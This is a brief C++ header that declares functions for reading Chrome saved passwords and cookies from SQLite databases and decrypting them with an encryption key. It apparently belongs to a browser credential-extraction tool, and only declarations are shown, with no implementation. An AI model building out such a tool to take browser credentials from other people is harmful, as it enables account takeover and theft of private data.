#include <windows.h>
#include <Wincrypt.h>
#include <tchar.h>
#include <iostream>
#include "sqlite3.h"


void get_chrome_pass(sqlite3* db);
void get_chrome_cookies(sqlite3* db);
void get_encryption_key(std::string);
bool key_decrypt(std::string,DWORD,char*);
bool initialize();
bool initialize_key(PBYTE,ULONG);
